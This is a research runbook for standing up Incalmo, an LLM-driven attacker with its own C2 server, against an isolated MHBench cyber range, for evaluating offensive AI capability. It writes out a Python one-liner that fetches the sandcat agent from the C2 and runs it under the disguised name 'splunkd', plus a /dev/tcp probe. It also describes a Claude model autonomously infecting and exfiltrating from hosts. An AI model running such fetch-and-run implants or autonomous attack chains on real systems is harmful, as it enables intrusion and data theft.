# Running Incalmo against an MHBench environment (CloudLab)

Companion to **MHBench's `host.md`** (which deploys the *target range*). This runbook stands
up the **Incalmo attacker** (LLM planner + C2 server) on `ctl` and points it at a deployed
benchmark. Written from the working `equifax_small` / project `eq1` setup.

CloudLab is **ephemeral per experiment** — hostnames, IPs and creds change on re-allocation.
Treat the concrete values below as *examples*; re-derive them each experiment (see
**§Connection cheatsheet**).

---

## Architecture — who runs where (read this first)

- **MHBench target VMs** = the range. Deploy per `host.md`.
- **Incalmo** (planner + C2 server) runs on **`ctl`** — it has internet (for the LLM API),
  the OpenStack creds, and is reachable from every tenant subnet.
- The benchmark's **Kali VM is the *foothold*** — it runs a `sandcat` agent that **beacons to
  Incalmo's C2** on `:8888`. It is NOT where Incalmo runs.
- The two connect via **one address**: `c2c_server` (Incalmo) == the agent's `-server`
  (== MHBench `--c2c-url`) == **ctl's tenant-reachable IP : 8888**.
- You do **not** configure the foothold's IP anywhere — Incalmo discovers it when the agent
  beacons in (`/beacon` self-reports `host_ip_addrs`). See `curl <c2>:8888/agents`.

> Incalmo ships its **own** C2 (`incalmo/c2server`, Flask) and a prebuilt `sandcat.go` agent.
> It does **not** need standalone MITRE Caldera. If a Caldera is running on `ctl:8888`, kill it.

---

## 0. Prereqs

- Target deployed per `host.md` (e.g. `equifax_small`, `--project-name eq1`), all VMs ACTIVE.
  Verify: `openstack --os-cloud openstack server list`.
- `Kali` image + `m2.large` flavor exist (every benchmark's attacker needs them).
- Incalmo repo on your workstation at `agent_dissertation/incalmo`.

## 1. Get Incalmo onto `ctl`

```bash
# from the workstation, in agent_dissertation/incalmo:
rsync -az -e "ssh -o IdentitiesOnly=yes -i ~/.ssh/id_ed25519" \
  --exclude '.git' --exclude '.venv' --exclude 'node_modules' --exclude '__pycache__' \
  --exclude '*.pyc' --exclude 'output/' --exclude '*.db' --exclude '*.pdf' \
  --exclude '*.png' --exclude '*.jpg' --exclude '.DS_Store' --exclude 'presentation/' \
  ./ dayan@<ctl-host>:incalmo/
```

## 2. uv sync (Python 3.13)

```bash
ssh -i ~/.ssh/id_ed25519 dayan@<ctl-host>
cd ~/incalmo && export PATH="$HOME/.local/bin:$PATH"
uv sync          # pulls Python 3.13 + langchain stack; Celery broker is SQLite (no Redis)
```

## 3. Pick `c2c_server` = ctl's tenant-reachable IP

It is **ctl's `br-ex` IP** (reachable from tenant subnets via their router; this is also why
public scanners can hit it). **Do NOT use `localhost`** — `c2c_server` is embedded into every
exploit/lateral-move payload (`ssh_lateral_move.py`, `exploit_struts.py`, …), so each
newly-infected host must be able to reach it.

```bash
ssh -i ~/.ssh/id_ed25519 dayan@<ctl-host> 'ip -4 -o addr show br-ex'   # -> e.g. REDACTED_C2_IP
```

Verify it's reachable from a target subnet (the broken/old C2 or a quick `nc` works as a probe):
from a tenant VM, `timeout 5 bash -c "exec 3<>/dev/tcp/<ctl-ip>/8888"` should succeed.

## 4. `config/config.json`

```json
{
    "name": "equifax_small_sonnet46",
    "strategy": {
        "planning_llm": "claude-4.6-sonnet",
        "execution_llm": "claude-4.6-sonnet",
        "abstraction": "incalmo"
    },
    "environment": "EquifaxSmall",
    "c2c_server": "http://<ctl-ip>:8888",
    "blacklist_ips": ["192.168.202.100"]
}
```

- **`planning_llm` must be a KEY in `incalmo/core/strategies/llm/langchain_registry.py`**, not a
  raw API id. Sonnet 4.6 was added as `claude-4.6-sonnet` → `model_name="claude-sonnet-4-6"`.
  (Paper's "Sonnet 4" = `claude-4.0-sonnet` → `claude-sonnet-4-0`, now retiring.)
- `environment`: pick the benchmark — `EquifaxSmall` / `EquifaxMedium` / `EquifaxLarge` /
  `ICSEnvironment` / `EnterpriseA` / `EnterpriseB` (see `config/attacker_config.py`).
- `blacklist_ips`: the **attacker VM's own IP** (so it doesn't nmap/attack itself). For
  `equifax_small` the Kali VM is `192.168.202.100`.

Push edits to ctl: `rsync -az -e "ssh -i ~/.ssh/id_ed25519" config/config.json dayan@<ctl-host>:incalmo/config/config.json`

## 5. `.env` — real Anthropic key  ⚠️

The repo's default `.env` ships a **placeholder** `ANTHROPIC_API_KEY` (2 chars) → the API
returns **401 invalid x-api-key**. Put a real key in `~/incalmo/.env` on ctl. Validate without
running the full attack:

```bash
cd ~/incalmo
export ANTHROPIC_API_KEY=$(grep -E '^ANTHROPIC_API_KEY=' .env | cut -d= -f2-)
uv run python -c "from langchain_anthropic import ChatAnthropic; print(ChatAnthropic(model_name='claude-sonnet-4-6', max_tokens=5).invoke('reply ok').content)"
# prints 'ok' -> key + model good
```

## 6. Start Incalmo's C2 on ctl (bare; no Docker on ctl)

```bash
# free :8888 first (kill any standalone Caldera)
tmux kill-session -t calsrv 2>/dev/null; pkill -f "server.py --insecure" 2>/dev/null

# C2 launch script (bare-uv equivalent of docker/attacker/start.sh, remote mode)
cat > /tmp/inc_c2.sh <<'SH'
#!/bin/bash
cd "$HOME/incalmo" || exit 1
export PATH="$HOME/.local/bin:$PATH"
export PYTHONPATH="$HOME/incalmo"        # required for the bare run
export MODE=remote DEBUG=false
CELERY_STATE_DIR=/tmp/celery_state; mkdir -p "$CELERY_STATE_DIR"; chmod 777 "$CELERY_STATE_DIR"
uv run celery -A incalmo.c2server.celery.celery_worker worker --concurrency=1 --statedb "$CELERY_STATE_DIR/celery.db" &
uv run celery -A incalmo.c2server.celery.celery_worker beat   --schedule "$CELERY_STATE_DIR/celerybeat-schedule" &
sleep 3
exec uv run ./incalmo/c2server/c2server.py     # Flask, binds 0.0.0.0:8888
SH

tmux new -d -s incc2 'bash /tmp/inc_c2.sh >/tmp/inc_c2.log 2>&1'
sleep 12
curl -sS http://localhost:8888/         # {"message":"Incalmo C2 Server API"}
curl -sS http://localhost:8888/health   # status: healthy
curl -sS http://localhost:8888/agents   # []  (no foothold yet)
```

## 7. Plant the foothold agent on the Kali VM

Incalmo's C2 serves its prebuilt `sandcat.go` from `/file/download`. Download it onto the Kali
VM and run it beaconing to the C2. (Run from `ctl`; reach the VM via the jumpbox — see
cheatsheet. Kali VM has no `curl`; use `python3`.)

```bash
# ON the Kali VM (192.168.202.100, user 'kali'):
python3 -c "import urllib.request as u; req=u.Request('http://<ctl-ip>:8888/file/download',method='POST',headers={'file':'sandcat.go','platform':'linux'}); open('/home/kali/splunkd','wb').write(u.urlopen(req,timeout=30).read())"
chmod +x /home/kali/splunkd
setsid /home/kali/splunkd -server http://<ctl-ip>:8888 -group red >/tmp/agent.log 2>&1 < /dev/null &
```

Verify from ctl: `curl -s http://localhost:8888/agents` → shows `hostname:"kali"`,
`host_ip_addrs:["192.168.202.100"]`.

> **Easier alternative once the C2 is up:** a fresh MHBench deploy/configure with
> `--c2c-url http://<ctl-ip>:8888` now plants the agent automatically (its `bake_attacker` +
> `start_attacker` plays fetch sandcat from Incalmo's `/file/download`). This is what failed
> originally only because the old Caldera was broken.

## 8. Run the experiment

```bash
cd ~/incalmo
tmux new -s incrun 'export PATH=$HOME/.local/bin:$PATH; uv run main.py 2>&1 | tee /tmp/inc_run.log'
```

- Watch progress: `watch -n3 'curl -s localhost:8888/agents | python3 -m json.tool'` — the list
  grows from 1 (foothold) as Incalmo infects webservers → databases.
- Detailed logs: `~/incalmo/output/<timestamped>/` (actions.json, llm.log).
- Trial time limit is 75 min (`incalmo_runner.py`).

---

## 9. Reset between experiments / next setups

**tmux is NOT a snapshot.** tmux only keeps the C2 / agent / run processes alive across SSH
disconnects — it cannot revert VM state. To "go back to a clean state" after an experiment
(Incalmo infects hosts, plants agents, exfiltrates data, may modify files), use one of:

**Option A — Teardown + redeploy (canonical, fully clean; now reliable):**
```bash
cd ~/MHBench
uv run python cli.py teardown environments/non-generated/equifax_small.json --project-name eq1 --yes
uv run python cli.py -v deploy environments/non-generated/equifax_small.json \
    --project-name eq1 --c2c-url http://<ctl-ip>:8888     # this also re-plants the foothold
```
Slow (re-provisions + Ansible) but guaranteed clean. Best for switching to a *different*
benchmark anyway (change `config.json` `environment` to match).

**Option B — OpenStack snapshots (fast revert to a clean baseline):**
```bash
# snapshot the clean baseline ONCE (per VM), while nothing has run yet:
for s in eq1-attacker eq1-webserver_0 eq1-webserver_1 eq1-database_0 eq1-database_1 eq1-database_2 eq1-database_3; do
  openstack --os-cloud openstack server image create --name "snap-$s" --wait "$s"
done
# after an experiment, revert each VM (keeps its IP/ports):
for s in eq1-attacker eq1-webserver_0 ...; do
  openstack --os-cloud openstack server rebuild "$s" --image "snap-$s"
done
```
Faster than redeploy. Caveats: snapshotting a *running* VM can be slightly inconsistent; the
foothold agent is captured in the snapshot and restarts on rebuild (usually convenient).

**The Incalmo side resets itself:** `main.py` calls `StateStore.initialize()` each run (resets
`state_store.db`). To also clear the in-memory agent list between runs, restart the C2
(`tmux kill-session -t incc2` then re-run §6) and re-plant the foothold (§7).

---

## Gotchas (hit during bring-up)

- **ctl has no Docker** → run the C2 bare (§6), not `docker compose`. Broker is SQLite, so **no
  Redis** needed.
- **`c2c_server` must be the reachable IP, never `localhost`** — it's embedded in beacon
  payloads run on the victims.
- **Default `.env` `ANTHROPIC_API_KEY` is a placeholder** (len 2) → 401. Set a real key (§5).
- **Kali VM**: user is `kali` (zsh shell), **no `curl`** — use `python3`/`wget`. Agent lives at
  `~/splunkd` here (MHBench's plays expect `/opt/splunkd`; functionally identical).
- **No foothold = Incalmo does nothing.** Always confirm `/agents` shows the Kali host before
  launching.
- **Model selection**: `planning_llm` is a `langchain_registry` *key*, not a raw API id.
- **Everything is ephemeral** per CloudLab experiment — re-derive ctl host, br-ex IP, jumpbox
  floating IP, and creds each time.

## Connection cheatsheet (current experiment: `mhbench-pg0`)

```bash
# ctl (OpenStack + Incalmo C2):
ssh -o IdentitiesOnly=yes -i ~/.ssh/id_ed25519 dayan@c220g2-010819.wisc.cloudlab.us

# tenant VM via the eq1 management jumpbox (floating IP from `openstack floating ip list`):
ssh -i ~/.ssh/mhbench.pem \
    -o ProxyCommand="ssh -i ~/.ssh/mhbench.pem -W %h:%p ubuntu@REDACTED_INFRA_IP" \
    kali@192.168.202.100

# tmux sessions on ctl:  incc2 (C2 server) · incrun (the attack run) · incsync (uv sync)
# C2 reachable address this experiment:  http://REDACTED_C2_IP:8888
```
